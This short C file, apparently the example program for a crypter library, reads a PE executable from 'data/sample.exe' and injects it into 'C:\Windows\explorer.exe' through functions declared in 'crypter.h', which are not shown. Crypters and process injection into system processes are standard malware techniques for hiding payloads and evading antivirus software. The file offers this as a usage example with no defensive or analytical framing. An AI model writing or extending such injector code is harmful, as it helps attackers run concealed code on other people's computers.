/**
 * example_injector.c
 */

#include <stdio.h>
#include "crypter.h"

int main(int argc, char **argv)
{
    pe_data_t packer;
    if (!pe_data_read(&packer, "data/sample.exe")) {
        return 1;
    }

    if (!pe_data_inject(&packer, "C:\\Windows\\explorer.exe")) {
        printf("what\n");
        return 1;
    }
    
    pe_data_free(&packer);
    return 0;
}